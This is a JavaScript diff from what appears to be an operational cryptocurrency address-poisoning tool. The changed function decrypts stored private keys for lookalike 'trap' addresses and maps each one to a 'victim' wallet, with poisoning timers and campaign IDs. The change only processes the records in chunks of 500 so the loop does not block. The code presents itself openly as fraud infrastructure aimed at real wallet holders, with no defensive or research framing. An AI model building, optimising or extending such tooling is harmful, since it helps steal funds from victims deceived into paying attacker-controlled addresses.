@@ -311,26 +311,38 @@ async function loadTrapsFromDB() {
     console.log(`[DEBUG] Fetched ${traps.length} traps from database`);
 
     let loaded = 0;
-    for (const row of traps) {
-      try {
-        const privateKey = decrypt(row.trap_private_key_enc);
-        const victim = row.victim_address.toLowerCase();
-        const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
-        const campaignId = row.campaign_id;
+    const CHUNK_SIZE = 500; // Process 500 at a time, then yield to event loop
 
-        const existing = victims.get(victim);
-        victims.set(victim, {
-          privateKey,
-          trapAddress: row.trap_address.toLowerCase(),
-          counterparty,
-          lastPoison: existing ? existing.lastPoison : 0,
-          lastCounterPoison: existing ? existing.lastCounterPoison : 0, // 🆕 Track counter-poison timing
-          campaignId,
-          victimAddress: victim,
-        });
-        loaded++;
-      } catch (err) {
-        console.warn(`[DEBUG] Failed to decrypt trap for victim ${row.victim_address}: ${err.message}`);
+    for (let i = 0; i < traps.length; i += CHUNK_SIZE) {
+      const chunk = traps.slice(i, i + CHUNK_SIZE);
+
+      for (const row of chunk) {
+        try {
+          const privateKey = decrypt(row.trap_private_key_enc);
+          const victim = row.victim_address.toLowerCase();
+          const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
+          const campaignId = row.campaign_id;
+
+          const existing = victims.get(victim);
+          victims.set(victim, {
+            privateKey,
+            trapAddress: row.trap_address.toLowerCase(),
+            counterparty,
+            lastPoison: existing ? existing.lastPoison : 0,
+            lastCounterPoison: existing ? existing.lastCounterPoison : 0,
+            campaignId,
+            victimAddress: victim,
+          });
+          loaded++;
+        } catch (err) {
+          console.warn(`[DEBUG] Failed to decrypt trap for victim ${row.victim_address}: ${err.message}`);
+        }
+      }
+
+      // Yield to event loop every CHUNK_SIZE traps to prevent blocking
+      if (i + CHUNK_SIZE < traps.length) {
+        console.log(`[DEBUG] Decrypted ${loaded}/${traps.length} traps...`);
+        await new Promise(resolve => setTimeout(resolve, 0));
       }
     }
 
